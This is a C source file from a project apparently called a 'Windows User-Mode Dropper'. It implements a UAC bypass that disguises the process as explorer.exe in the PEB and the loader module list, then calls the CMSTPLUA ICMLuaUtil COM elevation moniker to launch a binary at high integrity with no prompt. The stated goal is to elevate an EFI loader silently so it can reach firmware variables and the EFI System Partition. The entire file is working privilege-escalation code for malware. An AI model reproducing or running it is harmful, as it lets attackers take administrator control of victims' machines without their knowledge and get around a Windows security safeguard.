/*
 * ============================================================
 *  Project  : WhiteLotus — Windows User-Mode Dropper
 *  File     : BypassUAC.c
 * ============================================================
 *
 *  Description:
 *    Implements a UAC bypass using the ICMLuaUtil COM
 *    elevation moniker (CMSTPLUA). Temporarily masquerades
 *    the current process as explorer.exe in both the PEB
 *    ProcessParameters and the LDR module list, then invokes
 *    the privileged COM ShellExec method to launch the target
 *    binary at HIGH integrity level without a UAC prompt.
 *
 *  Purpose:
 *    - Elevate the EFI loader executable to administrator
 *      privileges silently, enabling it to access firmware
 *      environment variables and the EFI System Partition.
 *
 *  Author   : 0xbekoo
 *  Blog     : https://0xbekoo.github.io
 *  Updated  : 2026-05-21
 *
 * ============================================================
 */

#include "BypassUAC.h"

static VOID NTAPI LdrEnumCallback(
    PMY_LDR_ENTRY DataTableEntry,
    PVOID         Context,
    BOOLEAN* StopEnumeration
) {
    LDR_CTX* ctx = (LDR_CTX*)Context;

    if (DataTableEntry->DllBase != ctx->ImageBase) {
        *StopEnumeration = FALSE;
        return;
    }

    if (ctx->Restore) {
        g_RtlInitUS(&DataTableEntry->FullDllName, g_SavedFullDll);
        g_RtlInitUS(&DataTableEntry->BaseDllName, g_SavedBaseDll);
    }
    else {
        g_SavedFullDll = DataTableEntry->FullDllName.Buffer;
        g_SavedBaseDll = DataTableEntry->BaseDllName.Buffer;
        g_RtlInitUS(&DataTableEntry->FullDllName, g_ExplorerPath);
        g_RtlInitUS(&DataTableEntry->BaseDllName, L"explorer.exe");
    }

    *StopEnumeration = TRUE;
}

BOOL LoadNtdllFuncs(VOID) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;

    g_AcquireLock = (pfnRtlAcquirePebLock)GetProcAddress(hNtdll, "RtlAcquirePebLock");
    g_ReleaseLock = (pfnRtlReleasePebLock)GetProcAddress(hNtdll, "RtlReleasePebLock");
    g_LdrEnum = (pfnLdrEnumerateLoadedModules)GetProcAddress(hNtdll, "LdrEnumerateLoadedModules");
    g_RtlInitUS = (pfnRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");

    return (g_AcquireLock && g_ReleaseLock && g_LdrEnum && g_RtlInitUS);
}

static BOOL MasqueradeAsExplorer(VOID) {
    PMY_PEB Peb;
    WCHAR   szWindows[MAX_PATH];
    LDR_CTX ctx;

    GetWindowsDirectoryW(szWindows, MAX_PATH);

    g_ExplorerPath = (PWSTR)VirtualAlloc(NULL, 4096,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_ExplorerPath) return FALSE;

    lstrcpyW(g_ExplorerPath, szWindows);
    lstrcatW(g_ExplorerPath, L"\\explorer.exe");

    Peb = GetPeb();

    // Step 1: PEB->ProcessParameters
    g_AcquireLock();
    g_SavedImagePath = Peb->ProcessParameters->ImagePathName.Buffer;
    g_SavedCmdLine = Peb->ProcessParameters->CommandLine.Buffer;
    g_RtlInitUS(&Peb->ProcessParameters->ImagePathName, g_ExplorerPath);
    g_RtlInitUS(&Peb->ProcessParameters->CommandLine, L"explorer.exe");
    g_ReleaseLock();

    // Step 2: LDR_DATA_TABLE_ENTRY
    ctx.Restore = FALSE;
    ctx.ImageBase = Peb->ImageBaseAddress;
    g_LdrEnum(0, LdrEnumCallback, &ctx);

    wprintf(L"[+] Masquerade OK: PEB + LDR -> %s\n", g_ExplorerPath);
    return TRUE;
}

static VOID RestoreMasquerade(VOID) {
    PMY_PEB Peb = GetPeb();
    LDR_CTX ctx;

    g_AcquireLock();
    g_RtlInitUS(&Peb->ProcessParameters->ImagePathName, g_SavedImagePath);
    g_RtlInitUS(&Peb->ProcessParameters->CommandLine, g_SavedCmdLine);
    g_ReleaseLock();

    ctx.Restore = TRUE;
    ctx.ImageBase = Peb->ImageBaseAddress;
    g_LdrEnum(0, LdrEnumCallback, &ctx);

    if (g_ExplorerPath) {
        VirtualFree(g_ExplorerPath, 0, MEM_RELEASE);
        g_ExplorerPath = NULL;
    }
    wprintf(L"[+] Masquerade restored\n");
}

static HRESULT AllocateElevatedObject(
    LPCWSTR lpObjectCLSID,
    REFIID  riid,
    void** ppv
) {
    WCHAR      szMoniker[MAX_PATH];
    BIND_OPTS3 bop;

    *ppv = NULL;
    ZeroMemory(&bop, sizeof(bop));
    bop.cbStruct = sizeof(bop);
    bop.dwClassContext = CLSCTX_LOCAL_SERVER;

    lstrcpyW(szMoniker, ELEVATION_MONIKER);
    lstrcatW(szMoniker, lpObjectCLSID);

    return CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, ppv);
}

BOOL RunElevated(LPCWSTR lpszExecutable) {
    HRESULT     hr;
    ICMLuaUtil* pUtil = NULL;
    BOOL        bResult = FALSE;
    OLECHAR* pszCLSID = NULL;
    WCHAR       szCLSID[64];

    if (StringFromCLSID(&CLSID_CMSTPLUA, &pszCLSID) != S_OK)
        return FALSE;
    lstrcpynW(szCLSID, pszCLSID, 64);
    CoTaskMemFree(pszCLSID);

    if (!MasqueradeAsExplorer()) {
        wprintf(L"[-] Masquerade failed\n");
        return FALSE;
    }

    hr = AllocateElevatedObject(szCLSID, &IID_ICMLuaUtil, (void**)&pUtil);

    RestoreMasquerade();

    if (FAILED(hr) || !pUtil) {
        wprintf(L"[-] AllocateElevatedObject failed: 0x%08X\n", hr);
        return FALSE;
    }

    hr = pUtil->lpVtbl->ShellExec(pUtil, lpszExecutable, NULL, NULL, 0, 1);

    if (SUCCEEDED(hr)) {
        wprintf(L"[+] Success: %s launched at HIGH IL\n", lpszExecutable);
        bResult = TRUE;
    }
    else {
        wprintf(L"[-] ShellExec failed: 0x%08X\n", hr);
    }

    pUtil->lpVtbl->Release(pUtil);
    return bResult;
}
